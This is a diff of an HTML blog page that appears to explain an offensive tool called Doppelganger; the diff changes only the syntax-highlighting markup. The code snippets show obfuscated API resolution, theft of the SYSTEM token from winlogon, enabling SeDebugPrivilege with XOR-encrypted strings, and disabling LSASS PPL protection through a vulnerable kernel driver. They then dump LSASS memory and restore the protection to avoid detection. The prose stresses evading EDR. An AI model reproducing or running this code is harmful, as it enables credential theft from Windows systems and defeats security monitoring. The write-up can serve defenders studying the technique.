+</span></span><span class="line"><span class="cl"><span class="nf">ResolveApiFromDll</span><span class="p">(</span><span class="n">hDbghelp</span><span class="p">,</span> <span class="n">MDWD_ENC</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">MDWD_ENC</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">pMDWD</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// Call it later:
+</span></span></span><span class="line"><span class="cl"><span class="nf">pMDWD</span><span class="p">(</span><span class="n">hClone</span><span class="p">,</span> <span class="n">pid</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">MiniDumpWithFullMemory</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">mci</span><span class="p">);</span>
 </span></span></code></pre></div><hr>
 <p>By combining runtime resolution, XOR obfuscation, and clean DLL loading, Doppelganger can operate <strong>without tipping off security tools that rely on API hooking or static analysis.</strong></p>
 <h3 id="token-manipulation">Token Manipulation</h3>
@@ -419,51 +410,51 @@
 </ol>
 <p>This grants Doppelganger SYSTEM-level access <strong>without spawning a new process</strong>, which helps avoid noisy behavior.</p>
 <h4 id="code-snippet-system-token-duplication">Code Snippet: SYSTEM Token Duplication</h4>
-<div class="highlight"><pre tabindex="0" style="color:#cad3f5;background-color:#24273a;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>HANDLE hSystemToken <span style="color:#91d7e3;font-weight:bold">=</span> <span style="color:#91d7e3">NULL</span>;
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#c6a0f6">if</span> (<span style="color:#91d7e3;font-weight:bold">!</span><span style="color:#8aadf4">GetSystemTokenAndDuplicate</span>(<span style="color:#91d7e3;font-weight:bold">&amp;</span>hSystemToken)) {
-</span></span><span style="display:flex;"><span>    <span style="color:#8aadf4">log_error</span>(<span style="color:#a6da95">&#34;Failed to duplicate SYSTEM token.&#34;</span>);
-</span></span><span style="display:flex;"><span>    <span style="color:#c6a0f6">return</span> <span style="color:#f5a97f">1</span>;
-</span></span><span style="display:flex;"><span>}
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#6e738d;font-style:italic">// Use the token to impersonate SYSTEM
-</span></span></span><span style="display:flex;"><span><span style="color:#6e738d;font-style:italic"></span><span style="color:#8aadf4">pIMP</span>(hSystemToken);  <span style="color:#6e738d;font-style:italic">// ImpersonateLoggedOnUser
-</span></span></span><span style="display:flex;"><span><span style="color:#6e738d;font-style:italic"></span><span style="color:#8aadf4">pSTT</span>(<span style="color:#91d7e3">NULL</span>, hSystemToken);  <span style="color:#6e738d;font-style:italic">// SetThreadToken
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">HANDLE</span> <span class="n">hSystemToken</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nf">GetSystemTokenAndDuplicate</span><span class="p">(</span><span class="o">&amp;</span><span class="n">hSystemToken</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">log_error</span><span class="p">(</span><span class="s">&#34;Failed to duplicate SYSTEM token.&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// Use the token to impersonate SYSTEM
+</span></span></span><span class="line"><span class="cl"><span class="nf">pIMP</span><span class="p">(</span><span class="n">hSystemToken</span><span class="p">);</span>  <span class="c1">// ImpersonateLoggedOnUser
+</span></span></span><span class="line"><span class="cl"><span class="nf">pSTT</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="n">hSystemToken</span><span class="p">);</span>  <span class="c1">// SetThreadToken
 </span></span></span></code></pre></div><p>The actual resolution of the APIs <code>ImpersonateLoggedOnUser</code>, <code>SetThreadToken</code>, and <code>DuplicateTokenEx</code> is handled earlier via <strong>obfuscated API loading</strong>, as described in the previous chapter.</p>
-<div class="highlight"><pre tabindex="0" style="color:#cad3f5;background-color:#24273a;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>BOOL <span style="color:#8aadf4">GetSystemTokenAndDuplicate</span>(HANDLE<span style="color:#91d7e3;font-weight:bold">*</span> hSystemToken) {
-</span></span><span style="display:flex;"><span>    [...]
-</span></span><span style="display:flex;"><span>        <span style="color:#c6a0f6">if</span> (<span style="color:#8aadf4">pP32F</span>(hSnapshot, <span style="color:#91d7e3;font-weight:bold">&amp;</span>pe)) {]
-</span></span><span style="display:flex;"><span>        <span style="color:#c6a0f6">do</span> {
-</span></span><span style="display:flex;"><span>            <span style="color:#6e738d;font-style:italic">// Look for winlogon
-</span></span></span><span style="display:flex;"><span><span style="color:#6e738d;font-style:italic"></span>            <span style="color:#c6a0f6">if</span> (<span style="color:#8aadf4">_wcsicmp</span>(pe.szExeFile, <span style="color:#ed8796">L</span><span style="color:#a6da95">&#34;winlogon.exe&#34;</span>) <span style="color:#91d7e3;font-weight:bold">==</span> <span style="color:#f5a97f">0</span>) {
-</span></span><span style="display:flex;"><span>                hProcess <span style="color:#91d7e3;font-weight:bold">=</span> <span style="color:#8aadf4">pOP</span>(PROCESS_QUERY_INFORMATION, FALSE, pe.th32ProcessID);
-</span></span><span style="display:flex;"><span>                <span style="color:#c6a0f6">if</span> (hProcess) {
-</span></span><span style="display:flex;"><span>                    <span style="color:#c6a0f6">if</span> (<span style="color:#8aadf4">pOPTK</span>(hProcess, TOKEN_DUPLICATE <span style="color:#91d7e3;font-weight:bold">|</span> TOKEN_ASSIGN_PRIMARY <span style="color:#91d7e3;font-weight:bold">|</span> TOKEN_QUERY, <span style="color:#91d7e3;font-weight:bold">&amp;</span>hToken)) {
-</span></span><span style="display:flex;"><span>                        <span style="color:#c6a0f6">if</span> (<span style="color:#8aadf4">pDUPTOK</span>(hToken, TOKEN_ALL_ACCESS, <span style="color:#91d7e3">NULL</span>, SecurityImpersonation, TokenImpersonation, <span style="color:#91d7e3;font-weight:bold">&amp;</span>hDupToken)) {
-</span></span><span style="display:flex;"><span>                            <span style="color:#91d7e3;font-weight:bold">*</span>hSystemToken <span style="color:#91d7e3;font-weight:bold">=</span> hDupToken;
-</span></span><span style="display:flex;"><span>                            found <span style="color:#91d7e3;font-weight:bold">=</span> TRUE;
-</span></span><span style="display:flex;"><span>                            <span style="color:#8aadf4">log_info</span>(<span style="color:#a6da95">&#34;Requesting permissions for new duplicated token...&#34;</span>);
-</span></span><span style="display:flex;"><span>                            <span style="color:#8aadf4">EnableAllPrivileges</span>(hDupToken);
-</span></span><span style="display:flex;"><span>                            <span style="color:#8aadf4">CloseHandle</span>(hToken);
-</span></span><span style="display:flex;"><span>                            <span style="color:#8aadf4">CloseHandle</span>(hProcess);
-</span></span><span style="display:flex;"><span>                            <span style="color:#8aadf4">log_success</span>(<span style="color:#a6da95">&#34;Successfully duplicated token. Process can now run as SYSTEM.&#34;</span>);
-</span></span><span style="display:flex;"><span>                            <span style="color:#c6a0f6">break</span>;
-</span></span><span style="display:flex;"><span>    [...]
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">BOOL</span> <span class="nf">GetSystemTokenAndDuplicate</span><span class="p">(</span><span class="n">HANDLE</span><span class="o">*</span> <span class="n">hSystemToken</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="p">[...]</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nf">pP32F</span><span class="p">(</span><span class="n">hSnapshot</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">pe</span><span class="p">))</span> <span class="p">{]</span>
+</span></span><span class="line"><span class="cl">        <span class="k">do</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="c1">// Look for winlogon
+</span></span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="nf">_wcsicmp</span><span class="p">(</span><span class="n">pe</span><span class="p">.</span><span class="n">szExeFile</span><span class="p">,</span> <span class="sa">L</span><span class="s">&#34;winlogon.exe&#34;</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="n">hProcess</span> <span class="o">=</span> <span class="nf">pOP</span><span class="p">(</span><span class="n">PROCESS_QUERY_INFORMATION</span><span class="p">,</span> <span class="n">FALSE</span><span class="p">,</span> <span class="n">pe</span><span class="p">.</span><span class="n">th32ProcessID</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="p">(</span><span class="n">hProcess</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                    <span class="k">if</span> <span class="p">(</span><span class="nf">pOPTK</span><span class="p">(</span><span class="n">hProcess</span><span class="p">,</span> <span class="n">TOKEN_DUPLICATE</span> <span class="o">|</span> <span class="n">TOKEN_ASSIGN_PRIMARY</span> <span class="o">|</span> <span class="n">TOKEN_QUERY</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">hToken</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                        <span class="k">if</span> <span class="p">(</span><span class="nf">pDUPTOK</span><span class="p">(</span><span class="n">hToken</span><span class="p">,</span> <span class="n">TOKEN_ALL_ACCESS</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">SecurityImpersonation</span><span class="p">,</span> <span class="n">TokenImpersonation</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">hDupToken</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                            <span class="o">*</span><span class="n">hSystemToken</span> <span class="o">=</span> <span class="n">hDupToken</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">                            <span class="n">found</span> <span class="o">=</span> <span class="n">TRUE</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">                            <span class="nf">log_info</span><span class="p">(</span><span class="s">&#34;Requesting permissions for new duplicated token...&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                            <span class="nf">EnableAllPrivileges</span><span class="p">(</span><span class="n">hDupToken</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                            <span class="nf">CloseHandle</span><span class="p">(</span><span class="n">hToken</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                            <span class="nf">CloseHandle</span><span class="p">(</span><span class="n">hProcess</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                            <span class="nf">log_success</span><span class="p">(</span><span class="s">&#34;Successfully duplicated token. Process can now run as SYSTEM.&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                            <span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">[...]</span>
 </span></span></code></pre></div><p>To escalate privileges to SYSTEM, Doppelganger includes a routine that searches for a process already running as SYSTEM—specifically <code>winlogon.exe</code>. The function enumerates running processes via <code>CreateToolhelp32Snapshot</code>, locates <code>winlogon.exe</code>, and opens a handle to it. It then retrieves the process token and duplicates it using <code>DuplicateTokenEx</code> with full access rights. The resulting impersonation token is applied directly to the current thread using <code>ImpersonateLoggedOnUser</code> and <code>SetThreadToken</code>, allowing the process to operate under SYSTEM context. To ensure maximum capabilities, the tool also enables all needed privileges on the duplicated token before use.</p>
 <h4 id="enabling-sedebugprivilege">Enabling SeDebugPrivilege</h4>
 <p>Before accessing other processes (like LSASS), the <code>SeDebugPrivilege</code> must be enabled. Doppelganger does this programmatically and stealthily, using its obfuscated privilege manipulation logic:</p>
-<div class="highlight"><pre tabindex="0" style="color:#cad3f5;background-color:#24273a;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>BOOL <span style="color:#8aadf4">EnableENCPVG</span>(<span style="color:#c6a0f6">const</span> <span style="color:#ed8796">char</span><span style="color:#91d7e3;font-weight:bold">*</span> ENC_PRIV) {
-</span></span><span style="display:flex;"><span>    HANDLE hProc <span style="color:#91d7e3;font-weight:bold">=</span> <span style="color:#8aadf4">pGCP</span>(); <span style="color:#6e738d;font-style:italic">// GetCurrentProcess
-</span></span></span><span style="display:flex;"><span><span style="color:#6e738d;font-style:italic"></span>    HANDLE hToken <span style="color:#91d7e3;font-weight:bold">=</span> <span style="color:#91d7e3">NULL</span>;
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    DWORD flags <span style="color:#91d7e3;font-weight:bold">=</span> (<span style="color:#f5a97f">0x75</span> <span style="color:#91d7e3;font-weight:bold">^</span> <span style="color:#f5a97f">0x55</span>) <span style="color:#91d7e3;font-weight:bold">|</span> (<span style="color:#f5a97f">0x5D</span> <span style="color:#91d7e3;font-weight:bold">^</span> <span style="color:#f5a97f">0x55</span>);  <span style="color:#6e738d;font-style:italic">// TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY
-</span></span></span><span style="display:flex;"><span><span style="color:#6e738d;font-style:italic"></span>
-</span></span><span style="display:flex;"><span>    <span style="color:#c6a0f6">if</span> (<span style="color:#91d7e3;font-weight:bold">!</span><span style="color:#8aadf4">pOPTK</span>(hProc, flags, <span style="color:#91d7e3;font-weight:bold">&amp;</span>hToken)) <span style="color:#c6a0f6">return</span> FALSE;
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    BOOL result <span style="color:#91d7e3;font-weight:bold">=</span> <span style="color:#8aadf4">EnablePrivilege</span>(hToken, SE_DEBUG_ENC, <span style="color:#c6a0f6">sizeof</span>(SE_DEBUG_ENC));
-</span></span><span style="display:flex;"><span>    <span style="color:#8aadf4">CloseHandle</span>(hToken);
-</span></span><span style="display:flex;"><span>    <span style="color:#c6a0f6">return</span> result;
-</span></span><span style="display:flex;"><span>}
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">BOOL</span> <span class="nf">EnableENCPVG</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span><span class="o">*</span> <span class="n">ENC_PRIV</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">HANDLE</span> <span class="n">hProc</span> <span class="o">=</span> <span class="nf">pGCP</span><span class="p">();</span> <span class="c1">// GetCurrentProcess
+</span></span></span><span class="line"><span class="cl">    <span class="n">HANDLE</span> <span class="n">hToken</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">DWORD</span> <span class="n">flags</span> <span class="o">=</span> <span class="p">(</span><span class="mh">0x75</span> <span class="o">^</span> <span class="mh">0x55</span><span class="p">)</span> <span class="o">|</span> <span class="p">(</span><span class="mh">0x5D</span> <span class="o">^</span> <span class="mh">0x55</span><span class="p">);</span>  <span class="c1">// TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY
+</span></span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nf">pOPTK</span><span class="p">(</span><span class="n">hProc</span><span class="p">,</span> <span class="n">flags</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">hToken</span><span class="p">))</span> <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">BOOL</span> <span class="n">result</span> <span class="o">=</span> <span class="nf">EnablePrivilege</span><span class="p">(</span><span class="n">hToken</span><span class="p">,</span> <span class="n">SE_DEBUG_ENC</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">SE_DEBUG_ENC</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">CloseHandle</span><span class="p">(</span><span class="n">hToken</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
 </span></span></code></pre></div><p>This uses XOR-encrypted strings for <code>&quot;SeDebugPrivilege&quot;</code> and avoids suspicious privilege-enabling calls visible to many EDRs.</p>
 <h4 id="why-this-matters">Why This Matters</h4>
 <p>Privilege escalation is a high-risk activity when done sloppily. By <strong>borrowing a SYSTEM token from an existing process</strong>, Doppelganger avoids:</p>
@@ -492,38 +483,38 @@
 <li>Save the address of the <code>EPROCESS</code> structure for patching.</li>
 </ol>
 <p>The traversal is done fully in kernel memory, using the vulnerable driver to read arbitrary memory regions.</p>
-<div class="highlight"><pre tabindex="0" style="color:#cad3f5;background-color:#24273a;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span> <span style="color:#c6a0f6">while</span> (curr_entry <span style="color:#91d7e3;font-weight:bold">!=</span> list_head) {
-</span></span><span style="display:flex;"><span>        DWORD64 eproc <span style="color:#91d7e3;font-weight:bold">=</span> curr_entry <span style="color:#91d7e3;font-weight:bold">-</span> offs.ActiveProcessLinks;
-</span></span><span style="display:flex;"><span>        <span style="color:#ed8796">char</span> name[<span style="color:#f5a97f">16</span>] <span style="color:#91d7e3;font-weight:bold">=</span> { <span style="color:#f5a97f">0</span> };
-</span></span><span style="display:flex;"><span>        <span style="color:#8aadf4">ReadMemoryBuffer</span>(Device, eproc <span style="color:#91d7e3;font-weight:bold">+</span> offs.ImageFileName, name, <span style="color:#f5a97f">15</span>);
-</span></span><span style="display:flex;"><span>        name[<span style="color:#f5a97f">15</span>] <span style="color:#91d7e3;font-weight:bold">=</span> <span style="color:#a6da95">&#39;\0&#39;</span>;
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>        <span style="color:#6e738d;font-style:italic">// &#34;lsass.exe&#34;
-</span></span></span><span style="display:flex;"><span><span style="color:#6e738d;font-style:italic"></span>        <span style="color:#c6a0f6">const</span> <span style="color:#ed8796">unsigned</span> <span style="color:#ed8796">char</span> ls_enc[] <span style="color:#91d7e3;font-weight:bold">=</span> { <span style="color:#f5a97f">0x5C</span>, <span style="color:#f5a97f">0x42</span>, <span style="color:#f5a97f">0x53</span>, <span style="color:#f5a97f">0x40</span>, <span style="color:#f5a97f">0x47</span>, <span style="color:#f5a97f">0x1B</span>, <span style="color:#f5a97f">0x53</span>, <span style="color:#f5a97f">0x4F</span>, <span style="color:#f5a97f">0x5D</span> };
-</span></span><span style="display:flex;"><span>        <span style="color:#ed8796">char</span><span style="color:#91d7e3;font-weight:bold">*</span> target <span style="color:#91d7e3;font-weight:bold">=</span> <span style="color:#8aadf4">xor_decrypt_string</span>(ls_enc, <span style="color:#c6a0f6">sizeof</span>(ls_enc), XOR_KEY, key_len);
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>        <span style="color:#c6a0f6">if</span> (<span style="color:#8aadf4">_stricmp</span>(name, target) <span style="color:#91d7e3;font-weight:bold">==</span> <span style="color:#f5a97f">0</span>) {
-</span></span><span style="display:flex;"><span>            <span style="color:#8aadf4">free</span>(target);
-</span></span><span style="display:flex;"><span>            <span style="color:#8aadf4">log_info</span>(<span style="color:#a6da95">&#34;Found EPROC at 0x%llx&#34;</span>, eproc);
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>            <span style="color:#6e738d;font-style:italic">// Save EPROCESS address
-</span></span></span><span style="display:flex;"><span><span style="color:#6e738d;font-style:italic"></span>            SavedEproc <span style="color:#91d7e3;font-weight:bold">=</span> eproc;
-</span></span><span style="display:flex;"><span>[...]           
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"> <span class="k">while</span> <span class="p">(</span><span class="n">curr_entry</span> <span class="o">!=</span> <span class="n">list_head</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">DWORD64</span> <span class="n">eproc</span> <span class="o">=</span> <span class="n">curr_entry</span> <span class="o">-</span> <span class="n">offs</span><span class="p">.</span><span class="n">ActiveProcessLinks</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">char</span> <span class="n">name</span><span class="p">[</span><span class="mi">16</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span> <span class="mi">0</span> <span class="p">};</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">ReadMemoryBuffer</span><span class="p">(</span><span class="n">Device</span><span class="p">,</span> <span class="n">eproc</span> <span class="o">+</span> <span class="n">offs</span><span class="p">.</span><span class="n">ImageFileName</span><span class="p">,</span> <span class="n">name</span><span class="p">,</span> <span class="mi">15</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">name</span><span class="p">[</span><span class="mi">15</span><span class="p">]</span> <span class="o">=</span> <span class="sc">&#39;\0&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="c1">// &#34;lsass.exe&#34;
+</span></span></span><span class="line"><span class="cl">        <span class="k">const</span> <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">ls_enc</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span> <span class="mh">0x5C</span><span class="p">,</span> <span class="mh">0x42</span><span class="p">,</span> <span class="mh">0x53</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">,</span> <span class="mh">0x47</span><span class="p">,</span> <span class="mh">0x1B</span><span class="p">,</span> <span class="mh">0x53</span><span class="p">,</span> <span class="mh">0x4F</span><span class="p">,</span> <span class="mh">0x5D</span> <span class="p">};</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">char</span><span class="o">*</span> <span class="n">target</span> <span class="o">=</span> <span class="nf">xor_decrypt_string</span><span class="p">(</span><span class="n">ls_enc</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">ls_enc</span><span class="p">),</span> <span class="n">XOR_KEY</span><span class="p">,</span> <span class="n">key_len</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nf">_stricmp</span><span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="n">target</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nf">free</span><span class="p">(</span><span class="n">target</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="nf">log_info</span><span class="p">(</span><span class="s">&#34;Found EPROC at 0x%llx&#34;</span><span class="p">,</span> <span class="n">eproc</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            <span class="c1">// Save EPROCESS address
+</span></span></span><span class="line"><span class="cl">            <span class="n">SavedEproc</span> <span class="o">=</span> <span class="n">eproc</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">[...]</span>           
 </span></span></code></pre></div><hr>
 <h4 id="step-3-patch-the-protection-field">Step 3: Patch the Protection Field</h4>
 <p>Once the <code>EPROCESS</code> structure for LSASS is found, the tool writes <code>0x00</code> to the <code>Protection</code> fields to disable PPL:</p>
-<div class="highlight"><pre tabindex="0" style="color:#cad3f5;background-color:#24273a;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#6e738d;font-style:italic">// Remove PPL from LSASS
-</span></span></span><span style="display:flex;"><span><span style="color:#6e738d;font-style:italic"></span><span style="color:#8aadf4">WriteMemoryPrimitive</span>(Device, <span style="color:#f5a97f">1</span>, eproc <span style="color:#91d7e3;font-weight:bold">+</span> offs.Protection <span style="color:#91d7e3;font-weight:bold">-</span> <span style="color:#f5a97f">2</span>, <span style="color:#f5a97f">0x00</span>); <span style="color:#6e738d;font-style:italic">// SignatureLevel
-</span></span></span><span style="display:flex;"><span><span style="color:#6e738d;font-style:italic"></span><span style="color:#8aadf4">WriteMemoryPrimitive</span>(Device, <span style="color:#f5a97f">1</span>, eproc <span style="color:#91d7e3;font-weight:bold">+</span> offs.Protection <span style="color:#91d7e3;font-weight:bold">-</span> <span style="color:#f5a97f">1</span>, <span style="color:#f5a97f">0x00</span>); <span style="color:#6e738d;font-style:italic">// SectionSignatureLevel
-</span></span></span><span style="display:flex;"><span><span style="color:#6e738d;font-style:italic"></span><span style="color:#8aadf4">WriteMemoryPrimitive</span>(Device, <span style="color:#f5a97f">1</span>, eproc <span style="color:#91d7e3;font-weight:bold">+</span> offs.Protection, <span style="color:#f5a97f">0x00</span>);     <span style="color:#6e738d;font-style:italic">// Protection
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="c1">// Remove PPL from LSASS
+</span></span></span><span class="line"><span class="cl"><span class="nf">WriteMemoryPrimitive</span><span class="p">(</span><span class="n">Device</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">eproc</span> <span class="o">+</span> <span class="n">offs</span><span class="p">.</span><span class="n">Protection</span> <span class="o">-</span> <span class="mi">2</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">);</span> <span class="c1">// SignatureLevel
+</span></span></span><span class="line"><span class="cl"><span class="nf">WriteMemoryPrimitive</span><span class="p">(</span><span class="n">Device</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">eproc</span> <span class="o">+</span> <span class="n">offs</span><span class="p">.</span><span class="n">Protection</span> <span class="o">-</span> <span class="mi">1</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">);</span> <span class="c1">// SectionSignatureLevel
+</span></span></span><span class="line"><span class="cl"><span class="nf">WriteMemoryPrimitive</span><span class="p">(</span><span class="n">Device</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">eproc</span> <span class="o">+</span> <span class="n">offs</span><span class="p">.</span><span class="n">Protection</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">);</span>     <span class="c1">// Protection
 </span></span></span></code></pre></div><p>This effectively <strong>unprotects LSASS</strong> for the duration of the operation, allowing duplication and dumping.</p>
 <hr>
 <h4 id="step-4-restore-original-protection">Step 4: Restore Original Protection</h4>
 <p>Once the clone is created and the dump is complete, Doppelganger use another function to <strong>restores the original PPL values</strong> to avoid artifacts and detection by security solutions that monitor process tampering:</p>
-<div class="highlight"><pre tabindex="0" style="color:#cad3f5;background-color:#24273a;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#6e738d;font-style:italic">// Restore LSASS PPL protection
-</span></span></span><span style="display:flex;"><span><span style="color:#6e738d;font-style:italic"></span><span style="color:#8aadf4">WriteMemoryPrimitive</span>(Device, <span style="color:#f5a97f">1</span>, SavedEproc <span style="color:#91d7e3;font-weight:bold">+</span> offs.Protection <span style="color:#91d7e3;font-weight:bold">-</span> <span style="color:#f5a97f">2</span>, OriginalSigLv);
-</span></span><span style="display:flex;"><span><span style="color:#8aadf4">WriteMemoryPrimitive</span>(Device, <span style="color:#f5a97f">1</span>, SavedEproc <span style="color:#91d7e3;font-weight:bold">+</span> offs.Protection <span style="color:#91d7e3;font-weight:bold">-</span> <span style="color:#f5a97f">1</span>, OriginalSecSigLv);
-</span></span><span style="display:flex;"><span><span style="color:#8aadf4">WriteMemoryPrimitive</span>(Device, <span style="color:#f5a97f">1</span>, SavedEproc <span style="color:#91d7e3;font-weight:bold">+</span> offs.Protection, OriginalProt);
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="c1">// Restore LSASS PPL protection
+</span></span></span><span class="line"><span class="cl"><span class="nf">WriteMemoryPrimitive</span><span class="p">(</span><span class="n">Device</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">SavedEproc</span> <span class="o">+</span> <span class="n">offs</span><span class="p">.</span><span class="n">Protection</span> <span class="o">-</span> <span class="mi">2</span><span class="p">,</span> <span class="n">OriginalSigLv</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nf">WriteMemoryPrimitive</span><span class="p">(</span><span class="n">Device</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">SavedEproc</span> <span class="o">+</span> <span class="n">offs</span><span class="p">.</span><span class="n">Protection</span> <span class="o">-</span> <span class="mi">1</span><span class="p">,</span> <span class="n">OriginalSecSigLv</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nf">WriteMemoryPrimitive</span><span class="p">(</span><span class="n">Device</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">SavedEproc</span> <span class="o">+</span> <span class="n">offs</span><span class="p">.</span><span class="n">Protection</span><span class="p">,</span> <span class="n">OriginalProt</span><span class="p">);</span>
 </span></span></code></pre></div><p>This level of cleanup makes Doppelganger more stealthy and forensically aware than most public tools.</p>
 <hr>
 <h4 id="why-this-works">Why This Works</h4>
@@ -547,15 +538,15 @@ But a <strong>cloned process</strong> has:</p>
 <hr>
 <h4 id="the-tool-of-choice-ntcreateprocessex">The Tool of Choice: <code>NtCreateProcessEx</code></h4>
 <p>Doppelganger uses the <strong>undocumented syscall <code>NtCreateProcessEx</code></strong> to create a new process, using <code>lsass.exe</code> as the parent process object:</p>
